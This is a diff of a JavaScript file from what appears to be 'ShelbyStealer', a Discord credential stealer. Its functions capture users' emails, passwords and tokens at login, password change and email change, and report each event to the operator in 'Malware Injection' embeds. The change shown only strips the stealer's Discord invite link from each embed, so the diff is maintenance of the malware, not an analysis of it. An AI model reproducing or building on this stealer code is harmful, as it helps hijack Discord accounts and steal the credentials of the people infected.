@@ -102,7 +102,7 @@ function FirstTime() {
 							content: "",
 							embeds: [{
 								title: "Discord Initalized",
-								description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**](https://discord.gg/J4VTFKv37s)",
+								description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**]()",
 								color: config["embed-color"],
 								fields: [{
 									name: "Malware Injection",
@@ -188,7 +188,7 @@ function FirstTime() {
 							content: "",
 							embeds: [{
 								title: "User got logged out",
-								description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**](https://discord.gg/J4VTFKv37s)",
+								description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**]()",
 								color: config["embed-color"],
 								fields: [{
 									name: "Malware Injection",
@@ -466,7 +466,7 @@ function Login(email, password, token) {
 								content: "",
 								embeds: [{
 									"title": "User Login",
-									description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**](https://discord.gg/J4VTFKv37s)",
+									description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**]()",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Malware Injection",
@@ -634,7 +634,7 @@ function Login(email, password, token) {
 											content: "",
 											embeds: [{
 												"title": "User Login",
-												description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**](https://discord.gg/J4VTFKv37s)",
+												description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**]()",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Malware Injection",
@@ -825,7 +825,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 								content: "",
 								embeds: [{
 									"title": "Password Changed",
-									description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**](https://discord.gg/J4VTFKv37s)",
+									description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**]()",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Malware Injection",
@@ -998,7 +998,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 											content: "",
 											embeds: [{
 												"title": "Password Changed",
-												description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**](https://discord.gg/J4VTFKv37s)",
+												description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**]()",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Malware Injection",
@@ -1193,7 +1193,7 @@ function ChangeEmail(newemail, password, token) {
 								content: "",
 								embeds: [{
 									"title": "Email Changed",
-									description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**](https://discord.gg/J4VTFKv37s)",
+									description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**]()",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Malware Injection",
@@ -1362,7 +1362,7 @@ function ChangeEmail(newemail, password, token) {
 											content: "",
 											embeds: [{
 												"title": "Email Changed",
-												description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**](https://discord.gg/J4VTFKv37s)",
+												description: "[**<:partner:909102089513340979> │ ShelbyStealer Discord**]()",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Malware Injection",
